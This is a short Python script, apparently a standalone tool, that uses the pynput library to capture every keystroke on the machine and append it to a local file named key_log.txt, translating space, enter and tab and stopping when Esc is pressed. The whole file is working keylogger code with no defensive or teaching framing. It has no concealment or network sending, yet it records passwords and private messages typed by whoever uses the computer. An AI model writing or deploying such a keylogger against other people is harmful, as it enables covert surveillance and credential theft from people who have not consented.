from pynput import keyboard

# Define the log file path
log_file = "key_log.txt"

# Function to handle key presses
def on_press(key):
    try:
        # Write the key to the log file
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as file:
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.tab:
                file.write("\t")
            else:
                file.write(f" [{key}] ")

# Function to handle key releases (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener for key presses
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
